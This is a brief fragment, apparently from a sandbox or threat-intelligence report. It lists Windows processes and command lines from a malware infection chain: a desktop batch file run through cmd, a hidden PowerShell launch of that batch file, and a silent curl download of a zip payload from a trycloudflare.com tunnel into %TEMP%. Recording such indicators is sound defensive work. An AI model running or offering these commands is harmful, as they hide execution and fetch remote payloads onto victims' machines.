  - cmd.exe
  - powershell.exe
  - chrome.exe
  - AppInstallerPythonRedirector.exe
  - python.exe
  - explorer.exe
  commandline:
  - cmd.exe /c C:\\Users\\usere\\Desktop\\non.bat
  - powershell -WindowStyle Hidden -Command Start-Process -FilePath non.bat -ArgumentList
    h -WindowStyle Hidden
  - curl -s -o %TEMP%\\01.zip https://staying-heavily-meaning-blowing.trycloudflare.com/01.zip
